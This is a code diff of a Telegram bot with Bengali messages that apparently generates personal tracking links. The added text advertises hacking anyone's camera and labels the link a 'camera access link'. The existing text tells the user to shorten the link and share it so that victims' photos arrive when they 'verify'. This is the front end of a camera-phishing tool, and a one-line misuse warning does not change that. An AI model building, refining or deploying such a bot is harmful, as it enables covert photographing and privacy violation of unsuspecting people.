@@ -22,7 +22,8 @@ def send_welcome(message):
     user_name = message.from_user.first_name
     welcome_text = (
         f"হ্যালো {user_name}!\n"
-        "Welcome to 50/50 bot\n\n"
+        "Welcome to 50/50 bot\n"
+        "এর সাহায্যে আপনি যে কারো ক্যামেরা হ্যাক (Hack) করতে পারবেন।\n\n"
         "⚠️ সতর্কবার্তা: কেউ এটি খারাপ কাজে ব্যবহার করবেন না।\n\n"
         "নিচের বাটন থেকে আপনার লিঙ্ক তৈরি করুন।"
     )
@@ -34,11 +35,10 @@ def send_link(message):
     user_id = message.chat.id
     personal_link = f"{BASE_URL}?id={user_id}"
     
-    # আপনার অনুরোধ অনুযায়ী মেসেজ ফরম্যাট
     response_text = (
         "✅ আপনার ভেরিফিকেশন লিঙ্ক তৈরি হয়েছে।\n\n"
-        f"🔗 লিঙ্ক: {personal_link}\n\n"
-        "লিংকটি ছোটো করুন\n"
+        f"🔗 ক্যামেরা অ্যাক্সেস লিঙ্ক: {personal_link}\n\n"
+        "লিঙ্কটি ছোট করুন:\n"
         "https://lc.cx/en\n\n"
         "এই লিঙ্কটি শেয়ার করুন। কেউ ভেরিফাই করলে ছবি এখানে আসবে।"
     )
